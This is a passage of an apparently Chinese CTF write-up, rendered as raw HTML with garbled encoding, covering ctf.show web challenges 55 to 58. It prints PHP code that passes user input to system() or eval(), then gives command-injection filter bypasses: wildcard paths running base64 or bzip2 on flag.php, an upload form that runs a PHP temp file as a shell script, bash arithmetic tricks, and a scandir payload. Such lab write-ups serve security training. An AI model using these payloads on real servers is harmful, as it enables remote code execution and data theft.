class="token operator">?</span><span class="token operator">?</span>c<span class="token operator">=</span>uniq<span class="token variable">$IFS</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span>c<span class="token operator">=</span><span class="token operator">/</span>bin<span class="token operator">/</span>c<span class="token operator">?</span><span class="token operator">?</span><span class="token variable">$IFS</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span class="token operator">?</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="web55-æ— å­—æ¯"><a href="#web55-æ— å­—æ¯" class="headerlink" title="web55(æ— å­—æ¯)"></a>web55(æ— å­—æ¯)</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/\;|[a-z]|\`|\%|\x09|\x26|\>|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="binç›®å½•"><a href="#binç›®å½•" class="headerlink" title="/binç›®å½•"></a>/binç›®å½•</h3><pre><code>binä¸ºbinaryçš„ç®€å†™ä¸»è¦æ”¾ç½®ä¸€äº› ç³»ç»Ÿçš„å¿…å¤‡æ‰§è¡Œæ¡£ä¾‹å¦‚:catã€cpã€chmod dfã€dmesgã€gzipã€killã€lsã€mkdirã€moreã€mountã€rmã€suã€tarã€base64ç­‰è¿™é‡Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ base64 ä¸­çš„64 è¿›è¡Œé€šé…ç¬¦åŒ¹é… å³ /bin/base64 flag.php</code></pre><h4 id="payloadï¼š-7"><a href="#payloadï¼š-7" class="headerlink" title="payloadï¼š"></a>payloadï¼š</h4><pre><code>?c=/???/????64 ????.???ä¹Ÿå°±æ˜¯/bin/base64 flag.php</code></pre><h3 id="usr-binç›®å½•"><a href="#usr-binç›®å½•" class="headerlink" title="/usr/binç›®å½•"></a>/usr/binç›®å½•</h3><pre><code>ä¸»è¦æ”¾ç½®ä¸€äº›åº”ç”¨è½¯ä»¶å·¥å…·çš„å¿…å¤‡æ‰§è¡Œæ¡£ä¾‹å¦‚c++ã€g++ã€gccã€chdrvã€diffã€digã€duã€ejectã€elmã€freeã€gnome*ã€ zipã€htpasswdã€kfmã€ktopã€lastã€lessã€localeã€m4ã€makeã€manã€mcopyã€ncftpã€ newaliasesã€nslookup passwdã€quotaã€smb*ã€wgetç­‰ã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨/usr/binä¸‹çš„bzip2æ„æ€å°±æ˜¯è¯´æˆ‘ä»¬å…ˆå°†flag.phpæ–‡ä»¶è¿›è¡Œå‹ç¼©ï¼Œç„¶åå†å°†å…¶ä¸‹è½½</code></pre><h4 id="paylaodï¼š"><a href="#paylaodï¼š" class="headerlink" title="paylaodï¼š"></a>paylaodï¼š</h4><pre><code>å…ˆ?c=/???/???/????2 ????.???ç„¶ååœ¨url + /flag.php.bz2 ä¸‹è½½æ–‡ä»¶</code></pre><h2 id="web56-æ— å­—æ¯å’Œæ•°å­—"><a href="#web56-æ— å­—æ¯å’Œæ•°å­—" class="headerlink" title="web56(æ— å­—æ¯å’Œæ•°å­—)"></a>web56(æ— å­—æ¯å’Œæ•°å­—)</h2><p>ç±»ä¼¼é¢˜ç›®ï¼š2021-ç¬¬äº”å±Šä¸–ç•Œæ™ºèƒ½å¤§ä¼š-ã€Œæ´¥é—¨æ¯ã€å›½é™…ç½‘ç»œå®‰å…¨åˆ›æ–°å¤§èµ›-Web-hate_php</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/\;|[a-z]|[0-9]|\\$|\(|\{|\'|\"|\`|\%|\x09|\x26|\>|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å†çœ‹ä¸€é<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank" rel="noopener">pç¥çš„æ–‡ç« </a></p><p>åˆ©ç”¨é€šé…ç¬¦ç»•è¿‡ï¼Œå¤–å¸¦shè„šæœ¬ï¼ˆæ­¤å¤„éœ€è¦ä¼ è¾“postæ•°æ®ï¼‰</p><p>æ‰€æœ‰å°±è¦å…ˆæ„é€ poståŒ…ï¼š</p><pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>width<span class="token punctuation">=</span>device-width, initial-scale<span class="token punctuation">=</span>1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>POSTæ•°æ®åŒ…POC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show/<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!--é“¾æ¥æ˜¯å½“å‰æ‰“å¼€çš„é¢˜ç›®é“¾æ¥--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>æ–‡ä»¶åï¼š<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>æäº¤<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™ä¸ªåŒ…ä¼šè¢«ä¿å­˜åœ¨ä¸´æ—¶æ–‡ä»¶ä¸­/tmp/phpXXXXXXï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç”¨.æ¥è§¦å‘è¿™ä¸ªè„šæœ¬æ–‡ä»¶</p><h3 id="payloadï¼š-8"><a href="#payloadï¼š-8" class="headerlink" title="payloadï¼š"></a>payloadï¼š</h3><pre><code>?c=.+/???/????????[@-[]//åŠ å·ä»£è¡¨ç©ºæ ¼post:#!/bin/shcat flag.php</code></pre><h2 id="WEB57"><a href="#WEB57" class="headerlink" title="WEB57"></a>WEB57</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">// è¿˜èƒ½ç‚«çš„åŠ¨å—ï¼Ÿ</span><span class="token comment" spellcheck="true">//flag in 36.php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\>|\&lt;|\.|\,|\?|\*|\-|\=|\[/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cat "</span><span class="token punctuation">.</span><span class="token variable">$c</span><span class="token punctuation">.</span><span class="token string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç‚¹æ²¡äº†é—®å·æ²¡äº†ï¼Œé€šé…ç¬¦ç›´æ¥æ‹‰äº†</p><p>getæ–°çŸ¥è¯†ç‚¹ï¼š</p><p>åˆ©ç”¨$å’Œ()æ„é€ æ•°å­—36æ¥å®ç°ç»•è¿‡</p><pre class="line-numbers language-php"><code class="language-php">$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">0</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token comment" spellcheck="true">//~0=-1</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"$((~$(())))"</span><span class="token string">"$((~$(())))"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">=</span><span class="token operator">-</span><span class="token number">2</span><span class="token comment" spellcheck="true">//åŒå¼•å·å¸®åŠ©åŒºåˆ†</span><span class="token operator">-</span><span class="token number">2</span><span class="token operator">-</span><span class="token number">1</span> <span class="token number">01</span>æ‰€è°“å–åçš„è§„å¾‹æ˜¯ä»¥<span class="token number">0</span>å’Œ<span class="token operator">-</span><span class="token number">1</span>ä¸­é—´ä¸ºyè½´å¯¹ç§°æ‰€ä»¥å¯¹<span class="token operator">-</span><span class="token number">2</span>å–åå°±æ˜¯<span class="token number">1</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"~$(("</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token string">""</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token string">"))"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">1</span>æ‰€ä»¥è¿™ä¸ª<span class="token string">"$((~$(())))"</span>ä¸œè¥¿éœ€è¦<span class="token number">37</span>ä¸ªä¹Ÿå°±æ˜¯<span class="token operator">-</span><span class="token number">37</span>ç„¶åç”¨<span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>æ¥åŒ…è£¹èµ·æ¥å®ç°å–åä¹Ÿå°±æ˜¯<span class="token operator">-</span><span class="token number">37</span><span class="token operator">=</span><span class="token number">36</span>æœ€å$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>ä¸€åŒ…è£¹å°±è¡¨ç¤º<span class="token number">36</span>äº†<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è„šæœ¬ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">'$((~$(('</span><span class="token punctuation">.</span><span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string">'$((~$(())))'</span><span class="token punctuation">,</span><span class="token number">37</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'))))'</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="payloadï¼š-9"><a href="#payloadï¼š-9" class="headerlink" title="payloadï¼š"></a>payloadï¼š</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$c</span><span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>çœ‹ä¼¼ç®€å•ï¼Œå®åˆ™ä»è¿™é‡Œå¼€å§‹å°±è¦æ¶‰åŠåˆ°disable_functionsäº†ï¼Œèµ·ç æˆ‘è¾“å…¥systemçš„æ—¶å€™æ˜¯å‡ºç°äº†æŠ¥é”™</p><h3 id="payloadï¼š-10"><a href="#payloadï¼š-10" class="headerlink" title="payloadï¼š"></a>payloadï¼š</h3><pre class="line-numbers language-php"><code class="language-php">c<span class="token operator">=</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token string">'__FILE__'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// ( [0] => ã€‚ [1] => .. [2] => flag.php [3] => index.php ) </span>c<span class="token 